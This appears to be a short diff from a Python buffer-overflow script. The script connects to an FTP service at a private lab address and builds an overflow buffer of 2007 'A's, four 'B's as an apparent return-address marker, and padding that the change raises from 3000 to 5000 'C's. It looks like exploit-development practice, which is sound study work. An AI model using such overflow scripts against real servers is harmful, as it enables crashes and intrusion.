@@ -7,7 +7,7 @@ connect=s.connect(('192.168.3.12',21))
 buf = ""
 buf += "A"*2007
 buf += "B" * 4
-buf += "C" * 3000
+buf += "C" * 5000
 buf += "\n"
 
 buf += "\n"
